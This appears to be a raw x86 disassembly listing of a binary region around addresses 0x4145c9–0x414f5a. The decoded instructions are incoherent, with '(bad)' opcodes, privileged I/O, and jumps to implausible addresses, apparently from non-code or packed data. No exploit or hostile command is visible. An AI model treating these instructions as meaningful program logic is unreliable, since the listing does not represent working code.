  4145c9:	loop   0x4145ec
  4145cb:	icebp  
  4145cc:	push   esp
  4145cd:	stos   DWORD PTR es:[edi],eax
  4145ce:	ficomp WORD PTR [edi-0x2a]
  4145d1:	cs jmp 0x4145de
  4145d4:	outs   dx,DWORD PTR ds:[esi]
  4145d5:	ins    BYTE PTR es:[edi],dx
  4145d6:	push   ss
  4145d7:	ret    
  4145d8:	loopne 0x4145c5
  4145da:	add    BYTE PTR [ecx-0x61],cl
  4145dd:	mov    eax,0x301f85e0
  4145e2:	enter  0xd994,0x2c
  4145e6:	retf   0x7fc7
  4145e9:	in     eax,0x59
  4145eb:	aam    0x95
  4145ed:	sti    
  4145ee:	stc    
  4145ef:	and    BYTE PTR [ecx],dl
  4145f1:	hlt    
  4145f2:	mov    ecx,0x682434f1
  4145f7:	je     0x41457c
  4145f9:	pop    ebx
  4145fa:	push   eax
  4145fb:	dec    esp
  4145fc:	loopne 0x4145ac
  4145fe:	in     al,dx
  4145ff:	inc    eax
  414600:	sbb    DWORD PTR [eax-0x3871d004],0xffffffe9
  414607:	mov    bh,0x26
  414609:	or     eax,edi
  41460b:	mov    WORD PTR [ebx],?
  41460d:	out    0x9b,eax
  41460f:	stc    
  414610:	jl     0xc9fc99fe
  414616:	mov    esp,ebp
  414618:	add    DWORD PTR [esi-0x7b16584f],ebp
  41461e:	push   0x9c38da89
  414623:	aaa    
  414624:	inc    ecx
  414625:	mov    eax,ds:0xf77f9413
  41462a:	mov    bh,0x4c
  41462c:	cmp    eax,0x529bd63
  414631:	dec    esi
  414632:	xchg   edx,eax
  414633:	mov    bh,0xab
  414635:	pusha  
  414636:	rol    DWORD PTR [eax-0x10],cl
  414639:	inc    eax
  41463a:	imul   ebp,DWORD PTR [eax],0x78
  41463d:	mov    esp,0xd295c950
  414642:	sub    al,0x49
  414644:	ds out 0xc0,al
  414647:	int    0x7c
  414649:	sbb    al,0x18
  41464b:	jmp    esi
  41464d:	xchg   ch,ah
  41464f:	daa    
  414650:	lock popa 
  414652:	pop    ebx
  414653:	cmp    DWORD PTR [esi],ecx
  414655:	lahf   
  414656:	cdq    
  414657:	fmul   QWORD PTR ds:0x83a2376d
  41465d:	cmp    al,0xb4
  41465f:	cli    
  414660:	mov    DWORD PTR [edx+0x27],edi
  414663:	stos   BYTE PTR es:[edi],al
  414664:	xchg   esp,eax
  414665:	pop    ecx
  414666:	jge    0x414686
  414668:	push   ds
  414669:	jecxz  0x4146af
  41466b:	js     0x4145f1
  41466d:	stos   BYTE PTR es:[edi],al
  41466e:	test   al,0x89
  414670:	es xor al,0x20
  414673:	xchg   ecx,eax
  414674:	jge    0x414668
  414676:	(bad)  
  414677:	fwait
  414678:	sbb    eax,0x21be2834
  41467d:	sbb    al,0x9a
  41467f:	sbb    edx,DWORD PTR [ebx+0x33085ca0]
  414685:	adc    DWORD PTR [eax-0x5777380a],esp
  41468b:	push   edx
  41468c:	push   ebp
  41468d:	das    
  41468e:	fimul  WORD PTR [esi-0x73014829]
  414694:	out    dx,al
  414695:	mov    ebp,0xfd207267
  41469a:	cmc    
  41469b:	aam    0xa3
  41469d:	jnp    0x4146a4
  41469f:	mov    eax,ds:0xd38a973a
  4146a4:	or     al,BYTE PTR [ebp+0x18]
  4146a7:	fsubr  st(4),st
  4146a9:	ins    BYTE PTR es:[edi],dx
  4146aa:	pop    ecx
  4146ab:	sbb    DWORD PTR [eax],esp
  4146ad:	ds mov dh,0xd8
  4146b0:	enter  0x8aa3,0xdf
  4146b4:	aaa    
  4146b5:	dec    eax
  4146b6:	cdq    
  4146b7:	call   DWORD PTR [esi]
  4146b9:	xor    al,0x15
  4146bb:	pop    edi
  4146bc:	(bad)
  4146bf:	inc    ecx
  4146c0:	add    al,0xd2
  4146c2:	push   cs
  4146c3:	mov    eax,0x42b3c5ca
  4146c8:	adc    al,0x8
  4146ca:	sbb    eax,0xdac3eae0
  4146cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d0:	retf   
  4146d1:	fstp   QWORD PTR [ebp-0x3eadb4b0]
  4146d7:	call   FWORD PTR [edx]
  4146d9:	icebp  
  4146da:	adc    al,0x13
  4146dc:	push   es
  4146dd:	cli    
  4146de:	mov    ecx,0x77c3f134
  4146e3:	aam    0x59
  4146e5:	das    
  4146e6:	cwde   
  4146e7:	xchg   esi,eax
  4146e8:	xchg   ecx,eax
  4146e9:	aas    
  4146ea:	or     DWORD PTR [edi-0x7a],ecx
  4146ed:	rol    DWORD PTR [esi-0x6c],cl
  4146f0:	sbb    bh,BYTE PTR [esi-0x17e33704]
  4146f6:	adc    eax,0xf189b0d7
  4146fb:	aaa    
  4146fc:	sahf   
  4146fd:	ds out 0xc1,al
  414700:	addr16 push ss
  414702:	popf   
  414703:	xor    al,0xaf
  414705:	xchg   edi,eax
  414706:	jo     0x317d267e
  41470c:	xchg   edx,eax
  41470d:	aam    0xbc
  41470f:	jae    0x414765
  414711:	outs   dx,DWORD PTR ds:[esi]
  414712:	pop    edx
  414713:	aam    0x16
  414715:	add    eax,DWORD PTR [edi]
  414717:	ss aas 
  414719:	dec    esp
  41471a:	dec    ecx
  41471b:	xor    eax,0xcb0f2964
  414720:	mov    ecx,0x290bb3c
  414725:	and    BYTE PTR [esp+edx*1+0x5b3fbcd4],dl
  41472c:	pop    ss
  41472d:	mov    eax,ds:0x2a7f70b
  414732:	adc    al,0x6a
  414734:	xchg   edi,eax
  414735:	data16 aaa 
  414737:	jmp    0x41477b
  414739:	mov    dh,0x9b
  41473b:	aaa    
  41473c:	mov    ebx,0x4eb02c03
  414741:	sub    ch,BYTE PTR [esi]
  414743:	sub    esp,DWORD PTR [ebx+esi*4-0x5d7aa8fb]
  41474a:	sbb    al,BYTE PTR ds:0x24e1498d
  414750:	push   ebp
  414751:	pop    esi
  414752:	in     al,0xdd
  414754:	push   edx
  414755:	or     DWORD PTR [edx+0x2d3d0b82],0x75
  41475c:	retf   
  41475d:	or     cl,ch
  41475f:	lock call 0xb211:0x1473cc82
  414767:	icebp  
  414768:	inc    esi
  414769:	test   BYTE PTR [ebp-0x5b],cl
  41476c:	test   ebp,ecx
  41476e:	mov    WORD PTR ds:0x589ac721,fs
  414774:	popa   
  414775:	xlat   BYTE PTR ds:[ebx]
  414776:	(bad)  
  414777:	int3   
  414778:	dec    esp
  414779:	es adc eax,0x7f55dc58
  41477f:	or     BYTE PTR [ecx-0x60],bh
  414782:	test   bl,cl
  414784:	pop    eax
  414785:	push   esp
  414786:	add    al,0x47
  414788:	leave  
  414789:	addr16 xchg esp,eax
  41478b:	(bad)  
  41478c:	imul   ecx,DWORD PTR [esi+0x7a2d995c],0x73
  414793:	scas   al,BYTE PTR es:[edi]
  414794:	mov    ?,WORD PTR [eax]
  414796:	dec    esp
  414797:	xchg   esp,eax
  414798:	pop    esi
  414799:	std    
  41479a:	add    dh,dl
  41479c:	or     al,0xad
  41479e:	stos   DWORD PTR es:[edi],eax
  41479f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147a0:	cmp    cl,BYTE PTR [ecx-0x46475f70]
  4147a6:	mov    ch,0xa
  4147a8:	mov    bl,0x46
  4147aa:	mov    ch,BYTE PTR [esi-0x3d]
  4147ad:	mov    eax,ds:0x5b783183
  4147b2:	xchg   ecx,eax
  4147b3:	sbb    ah,BYTE PTR [edx-0x43]
  4147b6:	dec    ebx
  4147b7:	test   BYTE PTR [ebx],al
  4147b9:	lea    ecx,[edx-0x7]
  4147bc:	mov    bh,0xbb
  4147be:	dec    edx
  4147bf:	push   eax
  4147c0:	pop    ebx
  4147c1:	xor    eax,0x7e864f0b
  4147c6:	adc    al,0xf8
  4147c8:	sbb    bl,ah
  4147ca:	xor    edx,DWORD PTR [ebp-0x68]
  4147cd:	inc    ecx
  4147ce:	retf   
  4147cf:	test   al,0x9b
  4147d1:	mov    esp,0x6127895c
  4147d6:	or     ebp,DWORD PTR [eax]
  4147d8:	in     al,dx
  4147d9:	std    
  4147da:	nop
  4147db:	xchg   DWORD PTR [edx],ebx
  4147dd:	jmp    0xbd44:0xfac25534
  4147e4:	inc    edx
  4147e5:	test   esi,ecx
  4147e7:	fnstsw WORD PTR [ecx-0x33]
  4147ea:	fild   QWORD PTR [esi-0x1448a76b]
  4147f0:	cmc    
  4147f1:	lods   eax,DWORD PTR ds:[esi]
  4147f2:	mov    ss,edi
  4147f4:	or     al,0x67
  4147f6:	imul   eax,DWORD PTR [esi+0x2fa62acc],0xdc2246e4
  414800:	into   
  414801:	sbb    DWORD PTR [ecx*1+0x6bc73ce1],ebx
  414808:	xor    eax,0x228289b5
  41480d:	test   al,0x6
  41480f:	mov    dl,0xc2
  414811:	xor    ecx,DWORD PTR [ebx+0x5b]
  414814:	(bad)  
  414816:	inc    ebx
  414817:	aam    0xe
  414819:	mov    ecx,0x67901c78
  41481e:	jns    0x414811
  414820:	xlat   BYTE PTR ds:[ebx]
  414821:	inc    edi
  414822:	sbb    ch,BYTE PTR ds:[ebp-0x2f]
  414826:	or     al,bh
  414828:	int    0x5f
  41482a:	int    0xdd
  41482c:	data16 adc bh,cl
  41482f:	pop    ss
  414830:	lahf   
  414831:	pop    es
  414832:	xchg   ecx,eax
  414833:	xor    edx,ebx
  414835:	cs int 0x7f
  414838:	and    al,0x6b
  41483a:	fnstsw WORD PTR [ecx+0x2fb0041f]
  414840:	call   0x33a9:0x2e52f68a
  414847:	jmp    0xda9abd05
  41484c:	lock inc edx
  41484e:	jo     0x41484b
  414850:	jge    0x4147fa
	...
  414a26:	jecxz  0x414a2e
  414a28:	add    DWORD PTR [edi-0x1b],esi
  414a2b:	ja     0x414a24
  414a2d:	xchg   esi,eax
  414a2e:	popf   
  414a2f:	mov    edx,0xa122c648
  414a34:	and    eax,0x1a9397d
  414a39:	add    BYTE PTR [edx],ah
  414a3b:	pop    es
  414a3c:	add    BYTE PTR [eax],al
  414a3e:	mov    eax,ds:0x5fa55a5d
  414a43:	outs   dx,BYTE PTR ds:[esi]
  414a44:	dec    ebx
  414a45:	push   ebp
  414a46:	and    al,0x25
  414a48:	xchg   edx,eax
  414a49:	mov    ch,0x6d
  414a4b:	fcomi  st,st(3)
  414a4d:	fisubr DWORD PTR [eax]
  414a4f:	adc    ah,BYTE PTR [edx]
  414a51:	daa    
  414a52:	fild   WORD PTR [edi+0x55]
  414a55:	js     0x414a98
  414a57:	mov    ah,0x6e
  414a59:	add    al,ch
  414a5b:	jae    0x414aaf
  414a5d:	in     al,dx
  414a5e:	int3   
  414a5f:	loop   0x414a25
  414a61:	cli    
  414a62:	and    BYTE PTR [ebp+0xbc57561],dh
  414a68:	mov    DWORD PTR [ecx],edi
  414a6a:	and    eax,0xabe18471
  414a6f:	mov    edi,0x804530fe
  414a74:	clc    
  414a75:	mov    ecx,0xb5fbbdc9
  414a7a:	adc    ah,BYTE PTR [eax-0x6b]
  414a7d:	popa   
  414a7e:	gs jmp 0x2383a677
  414a84:	daa    
  414a85:	mov    BYTE PTR [edx+edx*4-0x4fb97370],ah
  414a8c:	dec    eax
  414a8d:	sti    
  414a8e:	adc    BYTE PTR ds:0x2cd0acb8,0xf4
  414a95:	jbe    0x414ad2
  414a97:	das    
  414a98:	mov    ds:0x1657722c,al
  414a9d:	add    bl,0x6f
  414aa0:	jns    0x414a61
  414aa2:	sub    edx,ebp
  414aa4:	mov    bh,0x16
  414aa6:	sbb    eax,DWORD PTR [eax+0x7c]
  414aa9:	jp     0x414aab
  414aab:	push   ds
  414aac:	scas   eax,DWORD PTR es:[edi]
  414aad:	imul   esi,DWORD PTR [esi+0x5a],0xffffffff
  414ab1:	fdiv   st(3),st
  414ab3:	and    esi,DWORD PTR [ebp-0x6527848f]
  414ab9:	inc    esp
  414aba:	mov    ds:0x32c908f1,al
  414abf:	adc    dl,BYTE PTR [edx]
  414ac1:	retf   
  414ac2:	aam    0xe
  414ac4:	push   ebx
  414ac5:	cli    
  414ac6:	out    0x73,al
  414ac8:	jg     0x414ac4
  414aca:	outs   dx,DWORD PTR es:[esi]
  414acc:	cs jmp 0xeb09:0x5181cb82
  414ad4:	or     BYTE PTR [esi],ah
  414ad6:	jmp    0x414ae1
  414ad8:	xor    dh,ah
  414ada:	test   DWORD PTR [eax+0x61ef8c4e],edx
  414ae0:	mov    cl,0x78
  414ae2:	pop    esp
  414ae3:	mov    WORD PTR cs:[eax+0x52],es
  414ae7:	lock mov WORD PTR cs:[edx+ebp*4-0x6210001c],?
  414af0:	test   al,0x93
  414af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af3:	clc    
  414af4:	addr16 push ebx
  414af6:	pop    eax
  414af7:	ret    
  414af8:	and    DWORD PTR ds:0xc82b1574,ecx
  414afe:	mov    al,ds:0x358d5ee7
  414b03:	mov    al,0x4d
  414b05:	aas    
  414b06:	pop    esp
  414b07:	adc    DWORD PTR [ecx-0x65],esi
  414b0a:	push   edx
  414b0b:	neg    BYTE PTR [ecx+0x79533c4e]
  414b11:	rcl    BYTE PTR [esi],cl
  414b13:	gs int3 
  414b15:	xor    eax,0xce353fe8
  414b1a:	xor    DWORD PTR [esi+0x3e],edi
  414b1d:	loope  0x414b5b
  414b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b20:	sub    DWORD PTR [eax+0x7e],edx
  414b23:	mov    edi,0x3f3829ca
  414b28:	sbb    al,0xda
  414b2a:	aam    0xd7
  414b2c:	jmp    0x4d42d148
  414b31:	mov    esi,0xfef4afab
  414b36:	in     eax,dx
  414b37:	ja     0x414b3d
  414b39:	xor    al,0x60
  414b3b:	jmp    0x3317b72a
  414b40:	or     dl,bh
  414b42:	fst    QWORD PTR [edx]
  414b44:	lahf   
  414b45:	jg     0x414b36
  414b47:	dec    edi
  414b48:	sbb    cl,BYTE PTR [esp+ebx*2]
  414b4b:	xchg   esi,eax
  414b4c:	or     eax,0x5aba05fb
  414b51:	push   ebx
  414b52:	jecxz  0x414b59
  414b54:	outs   dx,DWORD PTR ds:[esi]
  414b55:	jne    0x414b6c
  414b57:	lahf   
  414b58:	idiv   BYTE PTR [esi+0x3a]
  414b5b:	mov    gs,WORD PTR [ecx]
  414b5d:	sti    
  414b5e:	and    al,0xca
  414b60:	dec    ebp
  414b61:	mov    WORD PTR [ecx-0x1e52aa97],fs
  414b67:	push   ebx
  414b68:	ret    0x30d6
  414b6b:	cs jne 0x414ba4
  414b6e:	(bad)  
  414b6f:	ds sahf 
  414b71:	or     ah,BYTE PTR [eax-0x68]
  414b74:	pop    edx
  414b75:	xor    eax,0x79b02e5b
  414b7a:	mov    esp,0xb7a99b66
  414b7f:	xor    eax,0x208a7f39
  414b84:	inc    edx
  414b85:	mov    edi,esp
  414b87:	outs   dx,DWORD PTR ds:[esi]
  414b88:	addr16 xor al,0x3f
  414b8b:	dec    ebx
  414b8c:	inc    edx
  414b8d:	retf   0x1240
  414b90:	and    ah,BYTE PTR [ebx+ebp*4]
  414b93:	add    BYTE PTR [esi+edx*1+0x57],ah
  414b97:	fidiv  DWORD PTR [ecx+0x76a36a7f]
  414b9d:	and    bl,BYTE PTR [esp+esi*1-0x67]
  414ba1:	pop    eax
  414ba2:	push   0x60825d41
  414ba7:	aas    
  414ba8:	ins    DWORD PTR es:[edi],dx
  414ba9:	sbb    bh,BYTE PTR [ecx-0x6b]
  414bac:	fwait
  414bad:	lahf   
  414bae:	jne    0x414c0e
  414bb0:	nop
  414bb1:	cmp    eax,0x7c83146a
  414bb6:	lds    ebp,FWORD PTR [edi]
  414bb8:	mov    edx,0x1e76a201
  414bbd:	addr16 icebp 
  414bbf:	pop    esp
  414bc0:	and    cl,BYTE PTR [edi-0x41]
  414bc3:	mov    esp,0xc9341874
  414bc8:	ja     0x414b99
  414bca:	pop    ebx
  414bcb:	inc    eax
  414bcc:	das    
  414bcd:	jno    0x414c1c
  414bcf:	mov    ds:0x7bc755fc,al
  414bd4:	sbb    BYTE PTR [ebx+ebx*2],ch
  414bd7:	and    BYTE PTR [edi+edi*1-0x2a],dl
  414bdb:	pop    esi
  414bdc:	rcl    esp,cl
  414bde:	push   ecx
  414bdf:	(bad)  
  414be0:	nop
  414be1:	dec    edi
  414be2:	push   ecx
  414be3:	pop    ds
  414be4:	xlat   BYTE PTR ds:[ebx]
  414be5:	popf   
  414be6:	sbb    bl,BYTE PTR [ebx]
  414be8:	rcr    ah,1
  414bea:	scas   eax,DWORD PTR es:[edi]
  414beb:	dec    esp
  414bec:	push   eax
  414bed:	or     ecx,ebx
  414bef:	cmp    BYTE PTR [esi],ch
  414bf1:	(bad)  [edx+0x1fd78bd0]
  414bf7:	mov    dh,0x4b
  414bf9:	sti    
  414bfa:	outs   dx,DWORD PTR ds:[esi]
  414bfb:	cmp    dh,BYTE PTR [ecx]
  414bfd:	sbb    BYTE PTR [ebx+ebx*8],dl
  414c00:	loopne 0x414bf8
  414c02:	into   
  414c03:	fidiv  WORD PTR [esi-0xd]
  414c06:	rcl    ebx,1
  414c08:	jae    0x414b90
  414c0a:	leave  
  414c0b:	mov    dh,0x85
  414c0d:	mov    ebx,0x79a41c98
  414c12:	xchg   esi,eax
  414c13:	xchg   ecx,eax
  414c14:	mov    DWORD PTR [edi],ebp
  414c16:	push   esi
  414c17:	and    ebx,DWORD PTR [esi+eax*8]
  414c1a:	mov    esp,0xc69ea447
  414c1f:	pop    edi
  414c20:	addr16 aas 
  414c22:	dec    ebp
  414c23:	ins    BYTE PTR es:[edi],dx
  414c24:	xchg   BYTE PTR [ebx+0x22],ch
  414c27:	mov    ebx,0x9745818b
  414c2c:	js     0x414c97
  414c2e:	pop    ds
  414c2f:	ror    DWORD PTR [ebp-0x417b2e1a],1
  414c35:	ja     0x414ca4
  414c37:	(bad)  
  414c38:	ds cmc 
  414c3a:	mov    ds:0xce1910f9,eax
  414c3f:	jge    0x414c67
  414c41:	out    dx,eax
  414c42:	(bad)  
  414c43:	fwait
  414c44:	jge    0x414c96
  414c46:	inc    ecx
  414c47:	adc    eax,0x8edb75d9
  414c4c:	mov    al,ds:0x2f6e42e
  414c51:	jne    0x414c69
  414c53:	mov    ecx,0xc1953bdf
  414c58:	xor    eax,0xfa1a2f1c
  414c5d:	outs   dx,BYTE PTR ds:[esi]
  414c5e:	gs cs jno 0x414cc9
  414c62:	cmp    ebx,ecx
  414c64:	mov    eax,DWORD PTR [ecx+0x744118f5]
  414c6a:	pop    ebx
  414c6b:	push   esp
  414c6c:	mov    DWORD PTR [esi+0x11aa945],edi
  414c72:	adc    al,0xd
  414c74:	je     0x414c52
  414c76:	xor    esi,esp
  414c78:	repz dec edx
  414c7a:	cld    
  414c7b:	clc    
  414c7c:	xlat   BYTE PTR ds:[ebx]
  414c7d:	jmp    0x6f98b9dc
  414c82:	dec    edx
  414c83:	dec    edi
  414c84:	rcl    esp,cl
  414c86:	mov    ah,BYTE PTR [ebx-0x3b]
  414c89:	cmp    esi,DWORD PTR [eax-0x31]
  414c8c:	cmp    eax,0x2d5a237d
  414c91:	push   esp
  414c92:	mov    ds:0xf1ae33bc,eax
  414c97:	sahf   
  414c98:	mov    cl,0xee
  414c9a:	mov    bl,0xaf
  414c9c:	cmc    
  414c9d:	xchg   DWORD PTR ds:0x4fa772d0,ecx
  414ca3:	repnz stos BYTE PTR es:[edi],al
  414ca5:	imul   edx,edx,0xffffff9f
  414ca8:	mov    ebx,0x3f3a2131
  414cad:	aam    0x9f
  414caf:	(bad)  
  414cb0:	aam    0xdf
  414cb2:	cmp    DWORD PTR [ecx+0x1d],0x53ceb346
  414cb9:	(bad)  
  414cbb:	outs   dx,DWORD PTR ds:[esi]
  414cbc:	aaa    
  414cbd:	fidivr WORD PTR [edi-0x30]
  414cc0:	push   edi
  414cc1:	test   al,0xca
  414cc3:	xchg   esp,eax
  414cc4:	xchg   ecx,eax
  414cc5:	std    
  414cc6:	fadd   QWORD PTR [ebx+0x2]
  414cc9:	pushf  
  414cca:	dec    ebp
  414ccb:	outs   dx,BYTE PTR ds:[esi]
  414ccc:	and    eax,0x179baef3
  414cd1:	xlat   BYTE PTR ds:[ebx]
  414cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd3:	pop    ebp
  414cd4:	cdq    
  414cd5:	(bad)  
  414cd6:	pushf  
  414cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd8:	push   0x9ef4987b
  414cdd:	retf   
  414cde:	add    DWORD PTR [edi+ebp*2-0x3dff0e25],ecx
  414ce5:	or     ch,al
  414ce7:	cmc    
  414ce8:	mul    DWORD PTR [edx]
  414cea:	add    bh,BYTE PTR [ecx]
  414cec:	pop    ebx
  414ced:	sub    ecx,edi
  414cef:	cld    
  414cf0:	sahf   
  414cf1:	in     eax,dx
  414cf2:	xlat   BYTE PTR ds:[ebx]
  414cf3:	dec    esi
  414cf4:	ss inc edx
  414cf6:	sbb    eax,0x623c3c50
  414cfb:	lock test BYTE PTR [edi],bh
  414cfe:	repz (bad) 
  414d01:	mov    dh,bh
  414d03:	xor    ecx,DWORD PTR [esp]
  414d06:	push   ebp
  414d07:	lods   eax,DWORD PTR ds:[esi]
  414d08:	imul   ebp,eax,0xb
  414d0b:	call   0x6f3fdb92
  414d10:	mov    ebp,0xfca01b7f
  414d15:	aam    0xf
  414d17:	pop    esp
  414d18:	add    BYTE PTR [eax],ah
  414d1a:	jne    0x414cc9
  414d1c:	cwde   
  414d1d:	or     ecx,DWORD PTR [ecx-0x5251c424]
  414d23:	jg     0x414d6f
  414d25:	jo     0x3ba95eff
  414d2b:	cmp    al,0xec
  414d2d:	sub    eax,0xc42a598b
  414d32:	js     0x414d75
  414d34:	popf   
  414d35:	(bad)  
  414d36:	jecxz  0x414db2
  414d38:	jnp    0x414cd5
  414d3a:	and    al,0x5c
  414d3c:	cmp    DWORD PTR [ecx+0x2e],0x9e59f043
  414d43:	dec    esi
  414d44:	fdivp  st(7),st
  414d46:	popa   
  414d47:	call   0xf987a1a4
  414d4c:	mov    al,ds:0xb424aa38
  414d51:	mov    esi,0x6e48206e
  414d57:	loope  0x414d31
  414d59:	mov    edi,0xfcbfe404
  414d5e:	lock stos BYTE PTR es:[edi],al
  414d60:	or     al,0x14
  414d62:	sub    BYTE PTR [edi+0x24],bh
  414d65:	test   DWORD PTR [esi+0x3b],edi
  414d68:	xor    ebp,eax
  414d6a:	bound  esp,QWORD PTR [ebp+0x36f875a5]
  414d70:	call   0xb624bda5
  414d75:	pop    es
  414d76:	sar    DWORD PTR [edx+0x76a1c656],1
  414d7c:	std    
  414d7d:	sbb    DWORD PTR [edx+ebp*4],0xfffffff5
  414d81:	icebp  
  414d82:	ds lods al,BYTE PTR gs:[esi]
  414d85:	dec    eax
  414d86:	pop    edi
  414d87:	add    eax,0x21bada32
  414d8c:	add    dh,BYTE PTR [ecx-0x33f4992e]
  414d92:	cmova  esp,DWORD PTR [eax]
  414d95:	jge    0x414d95
  414d97:	mov    ebx,0x4015d7ea
  414d9c:	in     al,dx
  414d9d:	imul   edi,DWORD PTR [edx-0xe7a7601],0xb61a1e4e
  414da7:	int    0xbc
  414da9:	scas   al,BYTE PTR es:[edi]
  414daa:	shr    BYTE PTR [edx],1
  414dac:	out    0x23,eax
  414dae:	xor    eax,0xec04d4ac
  414db3:	adc    eax,DWORD PTR [ecx-0x6b]
  414db6:	test   DWORD PTR [ebx],edi
  414db8:	out    0xe1,al
  414dba:	dec    eax
  414dbb:	push   ebp
  414dbc:	sbb    BYTE PTR ss:[esi-0x50616e23],al
  414dc3:	xor    DWORD PTR ds:0x8e8727ce,ebx
  414dc9:	sub    dh,BYTE PTR [esi-0x50]
  414dcc:	cli    
  414dcd:	or     edx,DWORD PTR [edi]
  414dcf:	push   ecx
  414dd0:	mov    WORD PTR [ecx],cs
  414dd2:	int    0x53
  414dd4:	jg     0x414e35
  414dd6:	push   edi
  414dd7:	cmp    eax,0xc837e474
  414ddc:	dec    ebp
  414ddd:	pop    ebp
  414dde:	loope  0x414ddf
  414de0:	sub    bl,al
  414de2:	ja     0x414e2c
  414de4:	jo     0x414d9b
  414de6:	jo     0x414e05
  414de8:	pop    ds
  414de9:	jb     0x414e34
  414deb:	fld    st(0)
  414ded:	push   edx
  414dee:	add    BYTE PTR [edx+0x52175821],cl
  414df4:	mov    dh,0x84
  414df6:	mov    esi,0x7adcff3f
  414dfb:	add    edi,DWORD PTR [ecx+0x5a]
  414dfe:	add    BYTE PTR [edx+0x2a],bl
  414e01:	push   esp
  414e02:	and    DWORD PTR [edi+0x2a],edx
  414e05:	mov    ch,0xd
  414e07:	xchg   edi,eax
  414e08:	test   al,0xf6
  414e0a:	push   esi
  414e0b:	xchg   esi,eax
  414e0c:	fwait
  414e0d:	sahf   
  414e0e:	loop   0x414e0b
  414e10:	mov    esp,0x87c586fa
  414e15:	xchg   esi,eax
  414e16:	ret    
  414e17:	or     al,0x61
  414e19:	adc    DWORD PTR [edx+0x5],edx
  414e1c:	xchg   esp,eax
  414e1d:	push   edi
  414e1e:	sbb    ecx,DWORD PTR [ebp-0x17742bb3]
  414e24:	fistp  QWORD PTR [ebp-0x7b]
  414e27:	aam    0xd5
  414e29:	fist   DWORD PTR ds:0x4e80ded1
  414e2f:	leave  
  414e30:	jns    0x414e53
  414e32:	fidivr DWORD PTR [ebx+0x1d]
  414e35:	loope  0x414e11
  414e37:	and    DWORD PTR [edi+eiz*4+0x66],edx
  414e3b:	cdq    
  414e3c:	push   esp
  414e3d:	mov    bl,0xdf
  414e3f:	loopne 0x414e66
  414e41:	push   cs
  414e42:	push   ebp
  414e43:	inc    esi
  414e44:	fcom   DWORD PTR ds:0xfd037d2c
  414e4a:	push   edi
  414e4b:	sub    BYTE PTR [di-0x69],dh
  414e4f:	pop    esp
  414e50:	sbb    eax,0xc85eb986
  414e55:	xchg   BYTE PTR [edi+esi*8],dh
  414e58:	sbb    BYTE PTR [esi-0x2878604b],cl
  414e5e:	jp     0x414de2
  414e60:	ss pop ds
  414e62:	lock cmp BYTE PTR [ebp-0x41],al
  414e66:	jp     0x414e9f
  414e68:	jo     0x414e9a
  414e6a:	jge    0x414dff
  414e6c:	pop    ebx
  414e6d:	fsubr  st,st(7)
  414e6f:	loop   0x414ea3
  414e71:	dec    esi
  414e72:	aaa    
  414e73:	gs mov dl,0x53
  414e76:	sub    eax,0x3243d8c4
  414e7b:	xlat   BYTE PTR ds:[ebx]
  414e7c:	jbe    0x414ec8
  414e7e:	mov    DWORD PTR gs:[eax],edi
  414e81:	call   0x5afc46aa
  414e86:	into   
  414e87:	cmp    BYTE PTR [edi+0x159d7428],bl
  414e8d:	sbb    bh,BYTE PTR [ebx+0x3cc275fe]
  414e93:	scas   al,BYTE PTR es:[edi]
  414e94:	mov    al,ds:0xf8a2e4df
  414e99:	mov    dl,0x86
  414e9b:	mov    eax,0x337ee4f2
  414ea0:	sub    eax,0x2d74535c
  414ea5:	adc    ecx,DWORD PTR [edi+0x18]
  414ea8:	pop    esi
  414ea9:	jge    0x414ea8
  414eab:	adc    al,0x30
  414ead:	loopne 0x414e77
  414eaf:	addr16 inc edi
  414eb1:	enter  0x1f8a,0xdb
  414eb5:	sub    ecx,esi
  414eb7:	or     eax,0xbd59471f
  414ebc:	mov    ebp,0xa35dd28c
  414ec1:	bound  edi,QWORD PTR [ecx-0x26676a9e]
  414ec7:	adc    DWORD PTR ds:[esi],edi
  414eca:	icebp  
  414ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ecc:	push   esi
  414ecd:	inc    ebp
  414ece:	adc    ebp,DWORD PTR [edi+ebp*2-0x2d9edc21]
  414ed5:	bound  ecx,QWORD PTR [ebx-0x1ae28c78]
  414edb:	call   0xb74d:0x3861f0c3
  414ee2:	or     DWORD PTR [ebx+0x44],esi
  414ee5:	ins    BYTE PTR es:[edi],dx
  414ee6:	fstp   TBYTE PTR [esi]
  414ee8:	pop    ebp
  414ee9:	fsub   DWORD PTR [edx]
  414eeb:	loope  0x414f40
  414eed:	aas    
  414eee:	es or  cl,al
  414ef1:	fldenv ds:0x62f2ebbf
  414ef7:	in     al,0xef
  414ef9:	cdq    
  414efa:	mov    esi,0x3cf9d2ea
  414eff:	adc    DWORD PTR [edi-0x420cea28],edx
  414f05:	imul   BYTE PTR [ebp+ebx*1-0x17]
  414f09:	cmp    al,al
  414f0b:	sbb    ebx,esi
  414f0d:	cmp    eax,0x3a1deb81
  414f12:	add    edi,esi
  414f14:	fld    st(6)
  414f16:	jmp    0xf905806e
  414f1b:	pop    edx
  414f1c:	fnstenv [ebx]
  414f1e:	sbb    ebp,DWORD PTR [edi]
  414f20:	cmp    BYTE PTR [edi+eiz*1+0x23],bl
  414f24:	divps  xmm3,xmm6
  414f27:	out    dx,al
  414f28:	aas    
  414f29:	test   eax,0x99748224
  414f2e:	pop    ds
  414f2f:	repnz dec edi
  414f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f32:	xlat   BYTE PTR ds:[ebx]
  414f33:	repnz sbb cl,cl
  414f36:	inc    edx
  414f37:	ins    BYTE PTR es:[edi],dx
  414f38:	xor    DWORD PTR [edx-0x12],esi
  414f3b:	inc    ebp
  414f3c:	aaa    
  414f3d:	mov    dh,0xc4
  414f3f:	sbb    DWORD PTR [edx+0x5b],0xaef15006
  414f46:	add    al,0x86
  414f48:	mov    BYTE PTR [eax],ch
  414f4a:	or     ecx,ebx
  414f4c:	fdivr  st,st(3)
  414f4e:	arpl   WORD PTR [esi+0x34],si
  414f51:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  414f53:	push   edx
  414f54:	in     al,dx
  414f55:	sub    edx,DWORD PTR [eax+0x2b]
  414f58:	or     ah,BYTE PTR [edi]
  414f5a:	in     al,dx
